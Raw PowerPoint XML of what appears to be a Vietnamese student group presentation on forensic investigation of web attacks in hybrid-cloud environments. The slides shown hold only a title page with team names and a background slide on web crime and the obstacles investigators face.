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1"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sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
      <p:regular r:id="rId55"/>
      <p:bold r:id="rId56"/>
      <p:italic r:id="rId57"/>
      <p:boldItalic r:id="rId58"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="JetBrains Mono" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId59"/>
      <p:bold r:id="rId60"/>
      <p:italic r:id="rId61"/>
      <p:boldItalic r:id="rId62"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Urbanist" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId63"/>
      <p:bold r:id="rId64"/>
      <p:italic r:id="rId65"/>
      <p:boldItalic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9.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66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font12.fntdata"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4.xml"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font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64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/font10.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5.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font" Target="fonts/font8.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6.fntdata"/><Relationship Id="rId65"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cd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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g3ecd522b7e8_2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e86b4ab0b9_4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g3e86b4ab0b9_4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ecd522b7e8_2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g3ecd522b7e8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ecd522b7e8_2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g3ecd522b7e8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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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g3ecd522b7e8_2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e841b75576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g3e841b75576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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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4" name="Google Shape;264;g3ecd522b7e8_2_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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2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g3ecd522b7e8_2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ecd522b7e8_2_2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9" name="Google Shape;319;g3ecd522b7e8_2_2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ecd522b7e8_2_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9" name="Google Shape;329;g3ecd522b7e8_2_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ecd522b7e8_2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9" name="Google Shape;339;g3ecd522b7e8_2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3" name="Google Shape;35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5" name="Google Shape;37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3ecd522b7e8_2_3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6" name="Google Shape;386;g3ecd522b7e8_2_3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3ecd522b7e8_2_3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7" name="Google Shape;397;g3ecd522b7e8_2_3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ecd522b7e8_2_3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8" name="Google Shape;408;g3ecd522b7e8_2_3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3ecd522b7e8_2_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0" name="Google Shape;420;g3ecd522b7e8_2_2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3e841b75576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9" name="Google Shape;439;g3e841b75576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3ecd522b7e8_2_3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1" name="Google Shape;451;g3ecd522b7e8_2_3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ecd522b7e8_2_3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4" name="Google Shape;464;g3ecd522b7e8_2_3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3ecd522b7e8_2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6" name="Google Shape;476;g3ecd522b7e8_2_3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ecd522b7e8_2_4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8" name="Google Shape;488;g3ecd522b7e8_2_4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3e86b4ab0b9_2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0" name="Google Shape;500;g3e86b4ab0b9_2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3e86b4ab0b9_2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g3e86b4ab0b9_2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3e86b4ab0b9_2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2" name="Google Shape;522;g3e86b4ab0b9_2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3e86b4ab0b9_2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3" name="Google Shape;533;g3e86b4ab0b9_2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3e86b4ab0b9_2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5" name="Google Shape;545;g3e86b4ab0b9_2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3e86b4ab0b9_2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7" name="Google Shape;557;g3e86b4ab0b9_2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3e86b4ab0b9_2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8" name="Google Shape;568;g3e86b4ab0b9_2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3e841b75576_0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3" name="Google Shape;583;g3e841b75576_0_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3e86b4ab0b9_2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7" name="Google Shape;597;g3e86b4ab0b9_2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g3e86b4ab0b9_2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9" name="Google Shape;609;g3e86b4ab0b9_2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3e841b75576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8" name="Google Shape;618;g3e841b75576_0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3e86b4ab0b9_4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7" name="Google Shape;627;g3e86b4ab0b9_4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3e86b4ab0b9_4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5" name="Google Shape;635;g3e86b4ab0b9_4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2" name="Google Shape;64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g3e841b75576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2" name="Google Shape;652;g3e841b75576_0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g3e86b4ab0b9_4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2" name="Google Shape;662;g3e86b4ab0b9_4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g3e86b4ab0b9_4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2" name="Google Shape;672;g3e86b4ab0b9_4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2" name="Google Shape;68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0" name="Google Shape;70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azweb.com.vn/tan-cong-csrf-la-gi/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.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image" Target="../media/image27.png"/></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27.png"/></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54.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image53.png"/></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4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4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51.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908175" y="607115"/>
            <a:ext cx="10591800" cy="27720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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Báo Cáo Đồ Án - Khoa Học Pháp Lý Số</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Google Shape;86;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="1390660"/>
            <a:ext cx="11121300" cy="16971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5250" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Investigating </a:t>
            </a:r>
            <a:endParaRPr sz="5250" b="1" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5250" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Web Attacks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Google Shape;87;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="3248710"/>
            <a:ext cx="10591800" cy="231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a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Điều tra và Truy vết Chứng cứ Số trong môi trường Hybrid-Cloud</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Google Shape;88;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="4552460"/>
            <a:ext cx="10591800" cy="1508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a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>GVHD:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> NCS. Nguyễn Hoàng Thành</a:t>
            </a:r>
            <a:endParaRPr i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nhóm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>: 12</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thực hiện:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> • Trần Thị Ánh Nguyệt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>N22DCAT040</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> • Trần Phúc Tiến </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>N22DCAT057</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> • Tạ Lê Anh Bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>N22DCAT008</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="89" name="Google Shape;89;p13"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect l="29829"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5895075" y="1390660"/>
            <a:ext cx="6245400" cy="4347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93"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Google Shape;94;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="581025"/>
            <a:ext cx="5190600" cy="519600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-442913" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="3375"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="romanUcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Bối Cảnh &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cấp Thiết</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Google Shape;95;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1238250"/>
            <a:ext cx="4943475" cy="1905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6" name="Google Shape;96;p14" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="9525"/>
            <a:ext cx="6086475" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1257300"/>
            <a:ext cx="51906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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sự gia tăng của Tội phạm Web</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="Google Shape;98;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1724025"/>
            <a:ext cx="4943400" cy="96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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Trong kỷ nguyên chuyển đổi số, các ứng dụng web lưu trữ lượng dữ liệu khổng lồ, trở thành mục tiêu béo bở cho các cuộc tấn công ngày càng tinh vi.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Google Shape;99;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2962275"/>
            <a:ext cx="51906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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thách thức trong Điều tra (DFIR)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Google Shape;100;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="3429000"/>
            <a:ext cx="4943400" cy="231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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Khi sự cố xảy ra, việc truy vết đối mặt với nhiều rào cản:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Google Shape;101;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="866775" y="4029075"/>
            <a:ext cx="4657800" cy="231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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Khối lượng dữ liệu Log khổng lồ và phân tán.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Google Shape;102;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="866775" y="4476750"/>
            <a:ext cx="4657800" cy="231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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hạ tầng phức tạp (Cloud, Microservices).</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Google Shape;103;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="866775" y="4924425"/>
            <a:ext cx="4657800" cy="6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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kẻ tấn công sử dụng các kỹ thuật </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Anti-Forensics</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Xóa dấu vết).</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Google Shape;104;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="4029075"/>
            <a:ext cx="857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0B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>▹</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="4476750"/>
            <a:ext cx="857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0B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>▹</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Google Shape;106;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="4924425"/>
            <a:ext cx="857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0B981"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>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10"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="111" name="Google Shape;111;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2081212"/>
            <a:ext cx="3486150" cy="3371850"/>
